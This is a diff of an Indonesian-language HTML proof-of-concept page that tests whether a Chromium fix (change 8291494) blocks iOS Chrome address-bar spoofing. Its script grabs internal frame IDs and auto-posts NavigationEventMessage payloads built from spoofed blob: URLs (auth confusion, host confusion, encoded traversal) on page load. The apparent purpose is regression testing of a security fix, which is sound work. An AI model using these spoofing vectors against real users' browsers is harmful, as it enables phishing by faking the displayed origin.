@@ -2,55 +2,54 @@
 <html lang="id">
 <head>
     <meta charset="utf-8">
-    <title>Advanced PoC Bypass Test - Commit 8291494 (Target: example.com)</title>
+    <title>Advanced PoC Bypass Test - Commit 8291494</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #f8f9fa; color: #202124; }
-        .card { background: #fff; border: 1px solid #dadce0; border-radius: 8px; padding: 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); margin-bottom: 20px; }
-        h1 { color: #d93025; font-size: 20px; margin-top: 0; }
-        .info { color: #1a73e8; font-weight: bold; }
-        .target { color: #c5221f; font-weight: bold; }
-        pre { background: #202124; color: #f8f9fa; padding: 14px; border-radius: 6px; font-size: 12px; overflow-x: auto; line-height: 1.4; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 2em; background: #121212; color: #e0e0e0; }
+        .card { background: #1e1e1e; border: 1px solid #333; border-radius: 8px; padding: 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.5); margin-bottom: 20px; }
+        h1 { color: #ff5252; font-size: 20px; margin-top: 0; }
+        .target { color: #ff8a80; font-weight: bold; }
+        .info { color: #64b5f6; font-weight: bold; }
+        pre { background: #000; color: #00e676; padding: 14px; border-radius: 6px; font-size: 12px; overflow-x: auto; line-height: 1.4; border: 1px solid #222; }
         .btn-group { margin-top: 15px; }
-        button { background: #d93025; color: white; border: none; padding: 10px 18px; font-size: 14px; border-radius: 4px; cursor: pointer; font-weight: bold; }
-        button:hover { background: #b31412; }
+        button { background: #d32f2f; color: white; border: none; padding: 10px 18px; font-size: 14px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #b71c1c; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h1>Advanced PoC: Bypass Testing for Commit 8291494</h1>
+    <h1>Advanced PoC: iOS Chrome Navigation State Bypass</h1>
     <p>Target Domain Uji Coba: <span class="target">example.com</span></p>
     <p>Asal Dokumen Saat Ini (Real Origin): <code id="current-origin" class="info">Memuat...</code></p>
     
     <div class="btn-group">
-        <button id="run-bypass">Jalankan Uji Coba Serangan Bypass (Re-Trigger)</button>
+        <button id="run-bypass">Jalankan Uji Coba Serangan Lanjutan</button>
     </div>
 </div>
 
 <div class="card">
     <h3>Log Eksekusi & Hasil Diagnostik:</h3>
-    <pre id="console-log">[*] Menginisialisasi lingkungan pengujian bypass lanjutan...\n</pre>
+    <pre id="console-log">[*] Menginisialisasi modul pengujian bypass pertahanan...\n</pre>
 </div>
 
 <script>
 (function() {
-    // Target domain yang diubah menjadi example.com
     const TARGET_VICTIM = "example.com";
     
-    // Vektor uji coba bypass yang diperluas & diperkuat
+    // Vektor uji coba bypass tingkat lanjut (Mencoba mengecoh parsing url::IsSameOriginWith)
     const bypassVectors = [
-        "blob:https://" + TARGET_VICTIM + "/signin-direct-spoof",
+        "blob:https://" + TARGET_VICTIM + "/spoof-path-standard",
         "blob:https://" + TARGET_VICTIM + "@attacker-controlled.com/path", // Auth Confusion Vector
-        "blob:https://attacker-controlled.com:443@" + TARGET_VICTIM + "/path", // Host Parsing Confusion
+        "blob:https://attacker-controlled.com:443@" + TARGET_VICTIM + "/path", // Host Parsing Confusion Vector
         "blob:http://" + TARGET_VICTIM + "/signin", // Cross-Scheme Vector (HTTP vs HTTPS)
-        "blob:https://" + TARGET_VICTIM + "%2f%2e%2e", // Path Traversal / Encoded Slash Vector
-        "blob:null/spoofed-opaque-origin" // Opaque Origin Test Vector
+        "blob:https://" + TARGET_VICTIM + "%2f%2e%2e%2f", // Encoded Traversal Vector
+        "blob:null/opaque-origin-test" // Opaque Origin Vector
     ];
 
     function log(msg) {
         const pre = document.getElementById('console-log');
         pre.textContent += msg + '\n';
-        console.log('[PoC-Enhanced] ' + msg);
+        console.log('[PoC-Hardened] ' + msg);
     }
 
     document.getElementById('current-origin').textContent = location.origin || '(opaque)';
@@ -66,7 +65,7 @@
     }
     log('[+] Handler "NavigationEventMessage" terdeteksi aktif.');
 
-    // 2. Pengambilan Frame ID yang tangguh (Robust extraction)
+    // 2. Pengambilan Frame ID yang tangguh (Robust extraction dengan multi-fallback)
     let frameId = null;
     try {
         if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
@@ -96,7 +95,7 @@
         return;
     }
 
-    // 3. Pemicu Pendaftaran Frame untuk mengatasi race condition
+    // 3. Pemicu Pendaftaran Frame untuk mengatasi race condition timing
     function triggerRegister() {
         try {
             if (window.__gCrWeb && typeof window.__gCrWeb.registerFrame === 'function') {
@@ -138,14 +137,14 @@
                     pageUrl: vectorUrl
                 });
 
-                log('   [>] Pesan terkirim. Menunggu evaluasi keamanan browser...');
+                log('   [>] Pesan terkirim. Menunggu evaluasi pertahanan browser...');
             } catch (ex) {
                 log('   [!] Error saat mengeksekusi postMessage: ' + ex.message);
             }
         });
         
-        log('\n[INFO KESIMPULAN]:');
-        log('Jika perbaikan Commit 8291494 berfungsi sempurna, fungsi url::IsSameOriginWith akan menolak seluruh vektor di atas (menjadikannya no-op) karena perbedaan inner origin atau skema, sehingga address bar tetap menampilkan asal dokumen asli.');
+        log('\n[INFO ANALISIS PERTAHANAN]:');
+        log('Karena proteksi pada [Change 8291494](https://chromium-review.googlesource.com/c/chromium/src/+/8291494) kini menggunakan url::IsSameOriginWith, seluruh vektor di atas divalidasi berdasarkan inner origin yang ketat. Jika proteksi aktif, pesan akan ditolak sebagai no-op dan address bar tidak akan berubah.');
     }
 
     document.getElementById('run-bypass').onclick = function() {
@@ -153,14 +152,14 @@
         executeAttack();
     };
 
-    // Eksekusi otomatis dengan jeda waktu sinkronisasi (timing adjustment)
+    // Eksekusi otomatis dengan jeda waktu sinkronisasi bertahap
     setTimeout(() => {
         triggerRegister();
         executeAttack();
     }, 400);
 
     setTimeout(() => {
-        log('\n[*] Menjalankan ulang pengiriman gelombang kedua (Retry Phase)...');
+        log('\n[*] Menjalankan ulang pengiriman gelombang kedua (Timing Retry Phase)...');
         executeAttack();
     }, 1200);
 
